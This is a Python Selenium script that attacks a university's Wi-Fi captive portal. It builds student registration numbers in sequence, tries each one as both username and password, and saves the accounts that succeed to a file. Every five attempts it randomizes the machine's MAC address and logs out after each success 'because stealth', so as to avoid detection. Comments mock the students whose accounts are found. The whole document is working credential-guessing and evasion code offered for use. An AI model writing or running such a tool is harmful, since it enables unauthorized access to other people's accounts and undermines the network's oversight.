from time import sleep
from selenium.webdriver import Firefox
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
import os
import sys


opts = Options()
opts.headless = True
browser = Firefox(options=opts)
browser.set_page_load_timeout(5)
print("Browser running")
file = open("output.txt", "a")
counter = 1

interface_name = sys.argv[1]
srn_lower_limit = int(sys.argv[2])
srn_upper_limit = int(sys.argv[3])
department = sys.argv[4]
campus = sys.argv[5]
year = sys.argv[6]



for srn_num in range(srn_lower_limit, srn_upper_limit):
    if (srn_num >= 0 and srn_num <= 9):
        padded_srn = "00" + str(srn_num)
    elif (srn_num >= 10 and srn_num <= 99):
        padded_srn = "0" + str(srn_num)
    else:
        padded_srn = str(srn_num)

    real_srn = "PES" + campus + "UG" + str(year) + department + padded_srn

    if counter % 5 == 0:
        print("Randomizing mac")
        os.system("sudo venv/bin/spoof-mac.py randomize " + interface_name)

        # change this line for reconnecting command
        os.system(
            'networksetup -setairportnetwork en0 PESU-EC-Campus "PESU-EC-Campus"')

        sleep(6)
        print("Randomized mac!")
    counter += 1

    print("Trying ", real_srn)

    while (1):
        try:
            browser.get("http://192.168.10.1:8090/httpclient.html")
            # try until you get it. That's how you should be in life
            break
        except Exception as e:
            pass

    srn_input = browser.find_element(By.ID, "username")
    passwd_input = browser.find_element(By.ID, "password")
    srn_input.send_keys(real_srn)
    passwd_input.send_keys(real_srn)
    browser.find_element(By.ID, "loginbutton").click()
    sleep(1)
    logged_in_status_dabba = browser.find_element(By.ID, "credentials")
    logged_in_status = logged_in_status_dabba.get_attribute("class")
    # if it is successfully logged in, the class changes to 'loggedin', else it's 'loggedout'
    if (logged_in_status == "loggedin"):
        print(real_srn, "is an idiot")
        # we got an srn that's an idiot
        file.write(real_srn + "\n")
        # logout because stealth!
        browser.find_element(By.ID, "loginbutton").click()
        # it's the same button ID :\

    else:
        print(real_srn, "is a smartie pants")
        # this srn is a smartie pants
        # do nothing, move on
